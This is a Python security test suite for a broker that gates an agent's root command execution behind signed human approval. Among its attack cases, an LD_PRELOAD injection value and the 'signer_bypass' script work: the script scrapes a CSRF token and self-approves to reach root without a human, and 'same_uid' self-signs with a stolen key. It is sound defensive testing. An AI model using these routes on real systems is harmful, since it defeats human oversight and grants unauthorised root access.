"""Destructive tests belong ONLY in the disposable container described in README.md.

Findings are reported, not patched. No personal credentials, host paths or network targets.
"""
from __future__ import annotations

import concurrent.futures
import hashlib
import json
import os
from pathlib import Path
import random
import re
import secrets
import signal
import socket
import sqlite3
import subprocess
import time
import urllib.error
import urllib.request
from typing import Any, Callable
import uuid

ROOT = Path('/lab')
AGENT = 10001
APPROVER = 10002
GROUP = 10001
NODE = '/usr/local/bin/node'
results: list[dict[str, Any]] = []
children: list[subprocess.Popen[bytes]] = []


def record(case: str, expected: str, action: Callable[[], Any], *, vulnerability: bool = False) -> None:
    try:
        evidence = action()
        outcome = 'VULNERABLE' if vulnerability else 'PASS'
    except Exception as error:
        outcome, evidence = 'ERROR', f'{type(error).__name__}: {error}'
    item = {'case': case, 'expected': expected, 'result': outcome, 'evidence': evidence}
    results.append(item)
    print(json.dumps(item), flush=True)


def peer_code(uid: int, code: str, *args: str) -> str:
    """Run the attack with a real OS identity, not a UID field in JSON."""
    def drop() -> None:
        os.setgroups([])
        os.setgid(GROUP)
        os.setuid(uid)
    return subprocess.check_output(['python3', '-c', code, *args], preexec_fn=drop,
                                   timeout=15, text=True, stderr=subprocess.STDOUT).strip()


WIRE = '''import json,socket,sys
with socket.socket(socket.AF_UNIX) as s:
 s.settimeout(5);s.connect(sys.argv[1]);s.sendall(sys.argv[2].encode()+b'\\n')
 print(s.makefile().readline().strip())'''


class Fixture:
    def __init__(self, name: str, approver: int = APPROVER) -> None:
        self.dir = ROOT / name
        self.dir.mkdir(mode=0o755)
        self.state = self.dir / 'state'
        self.state.mkdir(mode=0o700)
        (self.state / 'keys').mkdir(mode=0o700)
        self.host_dir = self.dir / 'host'
        self.host_dir.mkdir(mode=0o700)
        self.key = self.host_dir / 'host.pem'
        public = subprocess.check_output([NODE, '--input-type=module', '-e', '''
import {generateKeyPairSync} from 'node:crypto';import {writeFileSync} from 'node:fs';
const k=generateKeyPairSync('ed25519');writeFileSync(process.argv[1],k.privateKey.export({type:'pkcs8',format:'pem'}),{mode:0o600});console.log(k.publicKey.export({type:'spki',format:'der'}).subarray(-32).toString('hex'));''', str(self.key)], text=True).strip()
        self.pub = self.state / 'keys/lab.pub'
        self.pub.write_text(public)
        self.pub.chmod(0o600)
        os.chown(self.key, approver, GROUP)
        os.chown(self.host_dir, approver, GROUP)
        self.socket = self.dir / 'broker.sock'
        self.config = self.dir / 'config.json'
        self.machine = str(uuid.uuid4())
        self.config.write_text(json.dumps({'machine_id': self.machine, 'agent_uid': AGENT,
            'approver_uid': approver, 'socket_gid': GROUP, 'state_dir': str(self.state),
            'socket': str(self.socket), 'approval_ttl_secs': 60}))
        self.config.chmod(0o600)
        self.approver = approver
        self.log = open(self.dir / 'broker.log', 'wb')
        self.start()

    def start(self) -> None:
        self.process = subprocess.Popen(['/usr/local/bin/broker', 'serve', str(self.config)], stdout=self.log, stderr=self.log)
        children.append(self.process)
        deadline = time.monotonic() + 5
        while True:
            if self.process.poll() is not None:
                raise RuntimeError('broker failed: ' + (self.dir / 'broker.log').read_text())
            if self.socket.exists():
                try:
                    self.call({'method': 'execution_status', 'id': 'readiness'})
                    return
                except (OSError, subprocess.SubprocessError):
                    pass
            if time.monotonic() > deadline:
                raise TimeoutError('broker readiness')
            time.sleep(.02)

    def call(self, request: dict[str, Any], uid: int = AGENT) -> dict[str, Any]:
        return json.loads(peer_code(uid, WIRE, str(self.socket), json.dumps(request)))

    def request(self, *, command: dict[str, Any] | None = None) -> dict[str, Any]:
        reply = self.call({'method': 'request_execution', 'spec': {
            'command': command or {'kind': 'argv', 'argv': ['/usr/bin/id', '-u']},
            'env': {}, 'reason': 'Disposable security lab', 'timeout_secs': 2}})
        assert reply['ok'], reply
        return reply['value']

    def cancel(self, pending: dict[str, Any]) -> None:
        reply = self.call({'method': 'cancel_execution', 'id': pending['envelope']['id']})
        assert reply['ok'], reply

    def sign(self, pending: dict[str, Any], uid: int | None = None) -> dict[str, Any]:
        # Explicitly authorized test control. Attack cases call this as AGENT only when proving stolen-key access.
        code = '''import os,subprocess,sys
print(subprocess.check_output([sys.argv[1],'--input-type=module','-e',"import {readFileSync} from 'node:fs';import {sign,createPrivateKey} from 'node:crypto';import {approvalPayload} from '/app/ui/dist/protocol.js';console.log(sign(null,approvalPayload({signing_payload:process.argv[2]},true),createPrivateKey(readFileSync(process.argv[1]))).toString('hex'));",sys.argv[2],sys.argv[3]],text=True).strip())'''
        signature = peer_code(self.approver if uid is None else uid, code, NODE, str(self.key), pending['signing_payload'])
        env = pending['envelope']
        return {'method': 'approve', 'id': env['id'], 'key_id': 'lab', 'number': env['number'], 'signature': signature, 'share_output': True}

    def finish(self, pending: dict[str, Any]) -> dict[str, Any]:
        deadline = time.monotonic() + 5
        while time.monotonic() < deadline:
            reply = self.call({'method': 'execution_status', 'id': pending['envelope']['id']})
            assert reply['ok'], reply
            status = reply['value']
            if status['state'] == 'complete':
                return status
            time.sleep(.02)
        raise TimeoutError('execution did not finish')

    def launch_count(self, pending: dict[str, Any]) -> int:
        with sqlite3.connect(self.state / 'state.sqlite3') as db:
            return db.execute("SELECT COUNT(*) FROM audit WHERE id=? AND event='running'", (pending['envelope']['id'],)).fetchone()[0]


def denied(reply: dict[str, Any], fragment: str | None = None) -> dict[str, Any]:
    assert reply['ok'] is False, reply
    if fragment:
        assert fragment in reply['error'], reply
    return reply


def private_reads(f: Fixture, canary: Path) -> dict[str, Any]:
    code = '''import json,pathlib,sys
out={}
for raw in sys.argv[1:]:
 try:pathlib.Path(raw).read_bytes();out[pathlib.Path(raw).name]='READABLE'
 except PermissionError:out[pathlib.Path(raw).name]='DENIED'
print(json.dumps(out))'''
    reads = json.loads(peer_code(AGENT, code, str(f.key), str(f.pub), str(f.state / 'state.sqlite3'), str(f.config), str(canary)))
    assert all(value == 'DENIED' for value in reads.values()), reads
    return reads


def main() -> None:
    assert os.geteuid() == 0 and os.environ.get('PE_DISPOSABLE_LAB') == '1', 'Run ONLY using the documented Docker command'
    assert os.uname().sysname == 'Linux' and Path('/.dockerenv').exists(), 'Disposable Linux container required'
    assert ROOT.is_dir() and not Path('/var/run/docker.sock').exists()
    record('LAB-01', 'No host directories, Docker socket or external network route', lambda: isolation())
    f = Fixture('isolated')
    private = ROOT / 'private'
    private.mkdir(mode=0o700)
    canary = private / 'fake-password.txt'
    canary.write_text(secrets.token_urlsafe(32))
    canary.chmod(0o600)
    canary_hash = hashlib.sha256(canary.read_bytes()).hexdigest()
    record('KEY-01', 'Agent cannot read separate-UID signing key, root trust store, config, ledger or fake password', lambda: private_reads(f, canary))
    pending = f.request()
    record('AUTH-01', 'No execution when only creating a request', lambda: pending_only(f, pending))
    valid = f.sign(pending)
    record('AUTH-02', 'Agent UID rejected even with a valid captured signature', lambda: denied(f.call(valid), 'peer cannot approve'))
    record('AUTH-03', 'Approver transport without valid signature rejected', lambda: denied(f.call({**valid, 'signature': '00' * 64, 'share_output': True}, APPROVER), 'invalid approval signature'))
    record('AUTH-04', 'Key path traversal rejected', lambda: denied(f.call({**valid, 'key_id': '../host'}, APPROVER), 'invalid key id'))
    record('AUTH-05', 'Spoofed peer uid field rejected by schema', lambda: denied(f.call({**valid, 'uid': APPROVER})))
    record('AUTH-06', 'Guessing every two-digit code without signer authority never executes', lambda: guess_codes(f, pending))
    f.cancel(pending)
    record('WIRE-01', 'Malformed/fuzzed messages cannot execute or kill broker', lambda: fuzz(f))
    record('WIRE-02', 'Oversized JSON rejected', lambda: oversized(f))
    record('WIRE-03', 'Slow partial request closed by total deadline', lambda: slow(f))
    record('PATH-01', 'Agent-writable executable and symlink aliases rejected', lambda: writable_path(f))
    record('ENV-01', 'Loader environment injection rejected', lambda: denied(f.call({'method': 'request_execution', 'spec': {'command': {'kind': 'argv', 'argv': ['/usr/bin/id']}, 'env': {'LD_PRELOAD': '/lab/agent/evil.so'}}}), 'not allowed'))
    record('AUTH-07', 'Cancelled approval cannot execute', lambda: denied(f.call(valid, APPROVER), 'not pending'))
    record('AUTH-08', 'Concurrent valid submissions cause exactly one launch', lambda: concurrency(f))
    record('AUTH-09', 'Identical fresh command needs new approval; old signature cannot be transplanted', lambda: transplant(f))
    record('AUTH-10', 'Pending approval cannot survive broker restart', lambda: restart(f))
    record('KEY-02', 'Same-UID production config must not allow agent signing-key theft', lambda: same_uid(), vulnerability=True)
    start_host(f)
    record('HTTP-01', 'Foreign browser origin cannot submit approval', lambda: foreign_origin(f))
    record('HTTP-02', 'An unprivileged shell must not obtain a root execution by calling the signer HTTP API', lambda: signer_bypass(f, canary, canary_hash), vulnerability=True)
    record('KEY-03', 'No personal/login password is an input to the broker or signer', lambda: {'personal_credentials_used': False, 'fixture': 'random fake root-only canary; not a real login password', 'private_key_is': 'independent random Ed25519 key, not derived from a password'})


def isolation() -> dict[str, Any]:
    route = Path('/proc/net/route').read_text().splitlines()
    assert len(route) <= 1, route
    assert not Path('/Users').exists() and not Path('/host').exists()
    assert not Path('/var/run/docker.sock').exists()
    return {'external_routes': len(route) - 1, 'host_directories': False, 'docker_socket': False, 'uid_fixture': [AGENT, APPROVER]}


def pending_only(f: Fixture, pending: dict[str, Any]) -> dict[str, Any]:
    state = f.call({'method': 'execution_status', 'id': pending['envelope']['id']})['value']['state']
    assert state == 'pending' and f.launch_count(pending) == 0
    return {'state': state, 'launches': 0}


def guess_codes(f: Fixture, pending: dict[str, Any]) -> dict[str, Any]:
    for code in range(10, 100):
        denied(f.call({'method': 'approve', 'id': pending['envelope']['id'], 'key_id': 'lab', 'number': str(code), 'signature': '00' * 64, 'share_output': True}), 'peer cannot approve')
    assert f.launch_count(pending) == 0
    return {'attempts': 90, 'launches': 0}


def fuzz(f: Fixture) -> dict[str, Any]:
    rng = random.Random(20261109)
    payloads = [b'null', b'[]', b'{', b'{"method":"approve","method":"request_execution"}', b'\xff\xfe', b'{}']
    payloads += [rng.randbytes(rng.randrange(1, 128)).replace(b'\n', b'x') for _ in range(128)]
    script = '''import json,socket,sys
with socket.socket(socket.AF_UNIX) as s:
 s.settimeout(4);s.connect(sys.argv[1]);s.sendall(bytes.fromhex(sys.argv[2])+b'\\n');print(s.makefile().readline().strip())'''
    for payload in payloads:
        reply = json.loads(peer_code(AGENT, script, str(f.socket), payload.hex()))
        denied(reply)
    assert f.process.poll() is None
    return {'seed': 20261109, 'payloads': len(payloads), 'broker_alive': True}


def oversized(f: Fixture) -> dict[str, Any]:
    script = '''import json,socket,sys
with socket.socket(socket.AF_UNIX) as s:
 s.settimeout(5);s.connect(sys.argv[1])
 try:s.sendall(b' '+b'x'*70000+b'\\n')
 except BrokenPipeError:pass
 print(s.makefile().readline().strip())'''
    return denied(json.loads(peer_code(AGENT, script, str(f.socket))), 'too large')


def slow(f: Fixture) -> dict[str, Any]:
    script = '''import socket,sys,time
with socket.socket(socket.AF_UNIX) as s:
 s.settimeout(4);s.connect(sys.argv[1]);s.sendall(b'{');t=time.monotonic();data=s.makefile().readline();elapsed=time.monotonic()-t
 assert elapsed<3.5,(elapsed,data)
 print(data.strip())'''
    reply = json.loads(peer_code(AGENT, script, str(f.socket)))
    return denied(reply)


def writable_path(f: Fixture) -> dict[str, Any]:
    path = ROOT / 'agent'
    path.mkdir(mode=0o755)
    os.chown(path, AGENT, GROUP)
    peer_code(AGENT, "import os,sys;os.symlink('/usr/bin/id',sys.argv[1])", str(path / 'alias'))
    return denied(f.call({'method': 'request_execution', 'spec': {'command': {'kind': 'argv', 'argv': [str(path / 'alias')]}}}), 'must be owned')


def concurrency(f: Fixture) -> dict[str, Any]:
    pending = f.request()
    approval = f.sign(pending)
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        replies = list(pool.map(lambda _: f.call(approval, APPROVER), range(16)))
    assert sum(reply['ok'] for reply in replies) == 1, replies
    state = f.finish(pending)
    assert state['outcome']['stdout'].strip() == '0', state
    assert f.launch_count(pending) == 1
    return {'concurrent_submissions': 16, 'accepted': 1, 'root_launches': 1, 'control': 'explicitly authorized fixture signature'}


def transplant(f: Fixture) -> dict[str, Any]:
    first = f.request()
    approval = f.sign(first)
    assert f.call(approval, APPROVER)['ok']
    f.finish(first)
    second = f.request()
    denied(f.call(approval, APPROVER), 'not pending')
    denied(f.call({**approval, 'id': second['envelope']['id']}, APPROVER), 'invalid approval signature')
    assert f.launch_count(second) == 0
    f.cancel(second)
    return {'old_signature_replay': 'denied', 'id_transplant': 'denied', 'fresh_request_launches': 0}


def restart(f: Fixture) -> dict[str, Any]:
    pending = f.request()
    approval = f.sign(pending)
    f.process.terminate();f.process.wait(timeout=3)
    f.start()
    reply = denied(f.call(approval, APPROVER), 'not pending')
    assert f.launch_count(pending) == 0
    return reply


def same_uid() -> dict[str, Any]:
    f = Fixture('same-uid', AGENT)
    pending = f.request()
    approval = f.sign(pending, AGENT)
    assert f.call(approval, AGENT)['ok']
    state = f.finish(pending)
    assert state['outcome']['stdout'].strip() == '0', state
    return {'agent_read_own_uid_key': True, 'human_approval': False, 'command_uid': 0, 'condition': 'production accepts identical agent_uid and approver_uid'}


def start_host(f: Fixture) -> None:
    def drop() -> None:
        os.setgroups([]);os.setgid(GROUP);os.setuid(APPROVER)
    env = dict(os.environ, BROKER_SOCKET=str(f.socket), APPROVAL_KEY=str(f.key), APPROVAL_KEY_ID='lab', APPROVAL_MACHINE_ID=f.machine)
    log = open(f.dir / 'signer.log', 'wb')
    child = subprocess.Popen([NODE, '--import', '/app/ui/node_modules/tsx/dist/loader.mjs', '/app/ui/src/demo.ts'], env=env, preexec_fn=drop, stdout=log, stderr=log)
    children.append(child)
    deadline = time.monotonic() + 5
    while True:
        try:
            urllib.request.urlopen('http://127.0.0.1:7351/', timeout=1).close()
            return
        except OSError:
            assert child.poll() is None, (f.dir / 'signer.log').read_text()
            if time.monotonic() > deadline:
                raise TimeoutError('signer startup')
            time.sleep(.05)


def foreign_origin(f: Fixture) -> dict[str, Any]:
    code = '''import urllib.request,urllib.error
r=urllib.request.Request('http://127.0.0.1:7351/approve',data=b'{}',headers={'Origin':'https://foreign.invalid','Content-Type':'application/json'},method='POST')
try:urllib.request.urlopen(r);raise AssertionError('accepted')
except urllib.error.HTTPError as e:assert e.code==403;print('403 rejected')'''
    return {'response': peer_code(AGENT, code)}


def signer_bypass(f: Fixture, canary: Path, expected_hash: str) -> dict[str, Any]:
    code = "import hashlib,json,os;from pathlib import Path;print(json.dumps({'uid':os.geteuid(),'canary_sha256':hashlib.sha256(Path('" + str(canary) + "').read_bytes()).hexdigest()}))"
    pending = f.request(command={'kind': 'argv', 'argv': ['/usr/bin/python3', '-c', code]})
    attack = '''import json,re,sys,urllib.request
script=urllib.request.urlopen('http://127.0.0.1:7351/host.js').read().decode()
csrf=re.search(r'csrf="([a-f0-9]{64})"',script).group(1)
body=json.dumps({'id':sys.argv[1],'number':sys.argv[2]}).encode()
r=urllib.request.Request('http://127.0.0.1:7351/approve',data=body,headers={'Origin':'http://127.0.0.1:7351','Content-Type':'application/json','X-Approval-CSRF':csrf},method='POST')
reply=json.load(urllib.request.urlopen(r));print(json.dumps({'http_success':True,'state':reply.get('state'),'attacker_uid':__import__('os').geteuid()}))'''
    evidence = json.loads(peer_code(AGENT, attack, pending['envelope']['id'], pending['envelope']['number']))
    state = f.finish(pending)
    output = json.loads(state['outcome']['stdout'])
    assert output['uid'] == 0 and output['canary_sha256'] == expected_hash, state
    return {**evidence, 'signer_uid': APPROVER, 'human_approval': False, 'private_key_read_by_agent': False,
            'command_uid': output['uid'], 'fake_root_only_password_read': True, 'proof': 'canary digest matched without printing the canary'}


if __name__ == '__main__':
    try:
        main()
    finally:
        for child in reversed(children):
            if child.poll() is None:
                child.terminate()
                try:
                    child.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    child.kill();child.wait()
        print('LAB_RESULTS=' + json.dumps(results), flush=True)
    if any(item['result'] == 'ERROR' for item in results):
        raise SystemExit(2)
    if any(item['result'] == 'VULNERABLE' for item in results):
        raise SystemExit(1)
